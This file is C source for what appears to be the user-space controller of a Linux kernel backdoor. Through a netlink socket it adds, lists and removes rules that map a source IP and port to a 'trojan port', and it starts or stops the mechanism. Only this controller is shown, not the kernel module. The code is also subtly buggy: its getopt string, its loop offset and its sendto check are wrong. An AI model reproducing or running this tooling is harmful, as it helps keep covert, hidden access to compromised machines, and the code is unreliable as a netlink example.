#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <linux/netlink.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>

#include "../../common/log.h"
#include "../common/nlcmd.h"
#include "../../common/linux_list.h"
#include "../../common/utils.h"

#define DF_NETLINK 30
#define NL_MAX_PLAYLOAD 2048
static struct sockaddr_nl daddr;
static struct sockaddr_nl saddr;

typedef struct rule
{
    unsigned int sip;
    unsigned short sport;
    unsigned short trojanport; // 木马端口
    struct list_head node;
} rule_t;

static int __init_netlink(void)
{
    int sockfd = socket(AF_NETLINK, SOCK_RAW, DF_NETLINK);
    if (sockfd == -1)
    {
        LOG_ERROR("create socket error\n");
        return -1;
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.nl_family = AF_NETLINK;
    saddr.nl_pid = 100;
    saddr.nl_groups = 0;
    if (bind(sockfd, (struct sockaddr *)&saddr, sizeof(saddr)) != 0)
    {
        LOG_ERROR("bind() error\n");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

static int __send_cmd_to_kernel(int sockfd, nlcmd_t *cmd)
{

    memset(&daddr, 0, sizeof(daddr));
    daddr.nl_family = AF_NETLINK;
    daddr.nl_pid = 0; // to kernel
    daddr.nl_groups = 0;

    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(nlcmd_t)));
    memset(nlh, 0, sizeof(struct nlmsghdr));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(nlcmd_t));
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_type = 0;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = getpid();

    memcpy(NLMSG_DATA(nlh), (char *)cmd, sizeof(nlcmd_t));

    if (!sendto(sockfd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&daddr, sizeof(struct sockaddr_nl)))
    {
        LOG_ERROR("sendto error\n");
        close(sockfd);
        free((void *)nlh);
        return -1;
    }

    free((void *)nlh);
    return 1;
}

void usage(void)
{
    LOG_ERROR("Usage: --action (add/del/list/start/stop) --sip [source ip] --sport [source port] --tport [trojan port]\n");
}

nlcmd_action_e __action(char *action)
{
    if (0 == strcasecmp("add", action))
        return ADD_RULE;
    if (0 == strcasecmp("del", action))
        return DEL_RULE;
    if (0 == strcasecmp("list", action))
        return LIST_RULES;
    if (0 == strcasecmp("start", action))
        return START;
    if (0 == strcasecmp("stop", action))
        return STOP;

    return -1;
}

void __recv_ruel_list_from_kernel(int sockfd)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(NL_MAX_PLAYLOAD));
    memset(nlh, 0, NL_MAX_PLAYLOAD);
    nlh->nlmsg_len = NLMSG_SPACE(NL_MAX_PLAYLOAD);
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_type = 0;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = getpid();

    int recvlen = recvfrom(sockfd, nlh, NLMSG_LENGTH(NL_MAX_PLAYLOAD), 0, NULL, NULL);
    if (0 > recvlen)
    {
        LOG_ERROR("recv form kernel error\n");
        close(sockfd);
        exit(-1);
    }

    char *pdata = NLMSG_DATA(nlh);
    int i = 0;
    int total = (recvlen - NLMSG_HDRLEN) / sizeof(rule_t);
    LOG_DEBUG("rule total :%d", total);
    for (; i < total; i++)
    {
        pdata += i * sizeof(rule_t);
        rule_t *rule = (rule_t *)pdata;

        LOG_DEBUG("rule(%d): source [%u.%u.%u.%u:%u] trojanport: [%u]", i, IPSTR(rule->sip), rule->sport, rule->trojanport);
    }
}

int main(int argc, char **argv)
{
    int opt, index;
    nlcmd_t cmd = {
        .action = -1,
        .config = {"", 0, 0},
    };

    struct option opts[] = {
        {"action", required_argument, NULL, 'a'},
        {"sip", required_argument, NULL, 'i'},
        {"sport", required_argument, NULL, 'p'},
        {"tport", required_argument, NULL, 't'},
        {NULL, no_argument, NULL, 0}};

    while ((opt = getopt_long(argc, argv, "a:i:s:t:?", opts, &index)) != -1)
    {
        switch (opt)
        {
        case 'a':
            cmd.action = __action(optarg);
            break;
        case 'i':
            memset(cmd.config.sip, 0, sizeof(cmd.config.sip));
            memcpy(cmd.config.sip, optarg, strlen(optarg));
            break;
        case 'p':
            cmd.config.sport = atoi(optarg);
            break;
        case 't':
            cmd.config.trojanport = atoi(optarg);
            break;
        case '?':
        default:
            usage();
            return -1;
        }
    }

    if (-1 == cmd.action)
    {
        usage();
        return -1;
    }

    int sockfd = __init_netlink();
    if (0 > __send_cmd_to_kernel(sockfd, &cmd))
    {
        return -1;
    }

    if (cmd.action == LIST_RULES)
    {
        __recv_ruel_list_from_kernel(sockfd);
    }

    close(sockfd);

    return 0;
}
